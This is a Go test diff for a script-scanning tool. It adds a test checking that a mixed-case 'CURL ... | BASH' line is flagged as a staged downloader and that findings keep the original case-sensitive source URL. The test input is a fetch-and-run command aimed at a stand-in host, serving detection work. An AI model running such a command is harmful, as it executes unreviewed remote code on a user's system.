@@ -35,6 +35,20 @@ func TestAnalyzeScriptBodyIgnoresOrdinaryChmod(t *testing.T) {
 	}
 }
 
+func TestAnalyzeScriptBodyPreservesCaseSensitiveSource(t *testing.T) {
+	source := "https://cdn.example.test/Release/Install.sh?Token=AbC123"
+	findings := analyzeScriptBody(source, "CURL https://example.test/payload | BASH")
+
+	if !hasReason(findings, "STAGED_DOWNLOADER") {
+		t.Fatalf("expected mixed-case script to match, got %+v", findings)
+	}
+	for _, finding := range findings {
+		if finding.Path != source {
+			t.Errorf("finding path = %q, want original source %q", finding.Path, source)
+		}
+	}
+}
+
 func hasReason(findings []report.Finding, reason string) bool {
 	for _, finding := range findings {
 		if finding.ReasonCode == reason {
